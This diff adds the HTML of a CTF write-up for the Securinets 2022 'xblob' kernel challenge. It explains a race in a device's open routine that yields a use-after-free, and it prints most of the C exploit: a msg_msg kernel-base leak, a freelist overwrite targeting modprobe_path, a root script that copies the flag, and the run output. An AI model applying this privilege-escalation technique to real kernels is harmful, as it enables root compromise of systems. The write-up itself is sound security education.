@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Securinets CTF Quals 2022 - xblob | kileak</title>
+
+
+
+
+
+<meta name="description" content="Securinets CTF Quals 2022 - xblob">
+
+
+<meta name="keywords" content="securinets, xblob">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/securinet22-xblob-copy/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Securinets CTF Quals 2022 - xblob</h1>
+      <p class="post-meta">Apr 10, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Securinets CTF Quals 2022 - xblob
+<!--break--></p>
+
+  <p>eXclusive BLOB</p>
+
+  <p>nc 167.99.37.61 9001</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/securinets2022/xblob/xblob.tar">xblob.tar</a> <a href="https://kileak.github.io/assets/securinets2022/xblob/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/securinets2022/xblob/pwn.c">pwn.c</a></p>
+
+</blockquote>
+
+<p>xblob was a kernel challenge, which provided a device, that can be used to read and write to a global buffer <code class="language-plaintext highlighter-rouge">g_buf</code> in the kernel.</p>
+
+<p>The memory for <code class="language-plaintext highlighter-rouge">g_buf</code> gets allocated when opening the device:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">module_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">mutex</span><span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">EBUSY</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="n">mutex</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">g_buf</span> <span class="o">=</span> <span class="n">kzalloc</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It uses a <code class="language-plaintext highlighter-rouge">mutex</code> variable there to check, if the file is already opened and disallows opening in that case.</p>
+
+<p>On closing the file, it frees <code class="language-plaintext highlighter-rouge">g_buf</code> without zeroing it out, which could potentially lead to an use-after-free.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">module_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">kfree</span><span class="p">(</span><span class="n">g_buf</span><span class="p">);</span>
+  <span class="n">mutex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>From a first glance, <code class="language-plaintext highlighter-rouge">mutex</code> will prevent, that we open the device twice. But it doesn’t use real locks and only checks on the <code class="language-plaintext highlighter-rouge">mutex</code> variable when entering <code class="language-plaintext highlighter-rouge">module_open</code>. So, if we manage to enter <code class="language-plaintext highlighter-rouge">module_open</code> twice, before it sets <code class="language-plaintext highlighter-rouge">mutex</code>, we could leverage the use-after-free.</p>
+
+<p>For this, I just used a thread and repeated opening the file in the background thread and current process until I got two valid file handles.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">doopen</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fd2</span><span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/xblob"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Try to race device opening to get two open fds</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+
+    <span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">,</span> <span class="n">thread2</span><span class="p">;</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">fd2</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fd1</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fd2</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+        <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">doopen</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/xblob"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+        <span class="n">pthread_join</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span><span class="mi">0</span> <span class="o">||</span> <span class="n">fd2</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Double open (%d / %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">);</span>
+<span class="p">...</span></code></pre></figure>
+
+<p>This might take some time, but at some point, it’ll succeed and we’ll have two file handles.</p>
+
+<p>We can now close one of those handles, which will free <code class="language-plaintext highlighter-rouge">g_buf</code>, while the other file handle can still be used to read and write from <code class="language-plaintext highlighter-rouge">g_buf</code>.</p>
+
+<p>From here, we’ll just have to leak kernel base and can then use the usual <code class="language-plaintext highlighter-rouge">modprobe_path</code> exploitation to copy the flag to an accessable directory, change the file permissions and read it from there.</p>
+
+<p>For leaking, I allocated a <code class="language-plaintext highlighter-rouge">msg_msg</code> struct into the freed <code class="language-plaintext highlighter-rouge">g_buf</code>. We can then use the device read to read the <code class="language-plaintext highlighter-rouge">msg_msg</code> header and overwrite the size of it. With another <code class="language-plaintext highlighter-rouge">msg_recv</code> we can then read everything behind the <code class="language-plaintext highlighter-rouge">msg_msg</code> struct.</p>
+
+<p>Spraying the heap with some <code class="language-plaintext highlighter-rouge">shmem</code> structs will give us a quite reliable leak.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Free g_buf by closing one fd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Allocate msg_msg into freed g_buf</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="kt">int</span> <span class="n">msgid</span> <span class="o">=</span> <span class="n">msgalloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="o">-</span><span class="mh">0x10</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Read msg_msg header into buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+        
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Increase msg_msg size via device write</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">+</span><span class="mh">0x18</span><span class="p">;</span>
+<span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Spray...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">spray_shmem</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Try to leak kernel base</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kleak</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">+</span><span class="n">i</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">==</span> <span class="mh">0xbc0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">kleak</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">kleak</span> <span class="o">-</span> <span class="mh">0xeb2bc0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0xe37e20</span><span class="p">;</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"- kernel leak : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kleak</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"- kernel base : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"- modprobe    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>
+    
+<span class="k">if</span><span class="p">(</span><span class="n">kleak</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to leak kernel base</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Since the <code class="language-plaintext highlighter-rouge">msg_msg</code> struct will also be freed after <code class="language-plaintext highlighter-rouge">msg_recv</code>, we can now use the device write to overwrite the <code class="language-plaintext highlighter-rouge">FD</code> pointer of the free chunk with an address slightly above <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Overwrite fd to point above modprobe_path</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+
+<span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
+
+<span class="o">*</span><span class="p">(</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xdead000000000100</span><span class="p">;</span>
+<span class="o">*</span><span class="p">(</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xdead000000000122</span><span class="p">;</span>
+
+<span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
+<span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="o">-</span><span class="mh">0x30</span><span class="p">;</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span></code></pre></figure>
+
+<p>Now, we just have to allocate chunks until the free chunk in <code class="language-plaintext highlighter-rouge">g_buf</code> is hit, after which our fake chunk would then get allocated.</p>
+
+<p>With another allocation, we can then overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Prepare modprobe scripts</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /root/flag.txt /tmp/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /tmp/flag' &gt; /tmp/copy.sh"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/copy.sh"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/dummy"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/dummy"</span><span class="p">);</span>
+ 
+<span class="p">...</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Reallocate freed chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="k">while</span><span class="p">(</span><span class="n">hit</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span> <span class="s">"/tmp/copy.sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>        
+    <span class="n">msgalloc</span><span class="p">(</span><span class="n">qid2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+
+    <span class="c1">// Check, if chunk in g_buf got allocated</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">hit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>        
+<span class="p">}</span>
+
+<span class="c1">// overwrite modprobe_path</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Overwrite modprobe_path</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span> <span class="s">"/tmp/copy.sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>        
+<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">modprobe_path</code> will now contain <code class="language-plaintext highlighter-rouge">/tmp/copy.sh</code>, so we just have to trigger <code class="language-plaintext highlighter-rouge">modprobe</code>, which will copy the flag from <code class="language-plaintext highlighter-rouge">/root/flag.txt</code> to <code class="language-plaintext highlighter-rouge">/tmp/flag</code> and make it readable.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Execute modprobe_path exploitation</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"/tmp/dummy"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"cat /tmp/flag"</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] Compile
+[+] Opening connection to 167.99.37.61 on port 9001: Done
+[+] Starting local process './exec.sh': pid 37248
+[*] Process './exec.sh' stopped with exit code 0 (pid 37248)
+[*] Booting
+[+] Upload: Done
+[*] Switching to interactive mode
+$ ./pwn
+[+] Prepare modprobe scripts
+[+] Open msg_msg queues
+[+] Try to race device opening to get two open fds
+[+] Double open (3 / 4)
+[+] Free g_buf by closing one fd
+[+] Allocate msg_msg into freed g_buf
+[+] Read msg_msg header into buffer
+[+] Increase msg_msg size via device write
+[+] Spray...
+[+] spray shmem structs
+[+] Try to leak kernel base
+- kernel leak : 0xffffffffb72b2bc0
+- kernel base : 0xffffffffb6400000
+- modprobe    : 0xffffffffb7237e20
+[+] Overwrite fd to point above modprobe_path
+[+] Reallocate freed chunk
+[+] Overwrite modprobe_path
+/tmp/dummy: line 1: \xff\xff\xff\xff: not found
+securinets{1t's_v3ry_h4rd_2_byp4ss_SMAP_by_4bus1ng_timerfd_ctx}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Securinets CTF Quals 2022 - xblob&amp;url=https://kileak.github.io/ctf/2022/securinet22-xblob-copy/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/securinet22-xblob-copy/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/securinet22-xblob copy';
+        var disqus_title = 'Securinets CTF Quals 2022 - xblob';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/securinet22-xblob copy';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
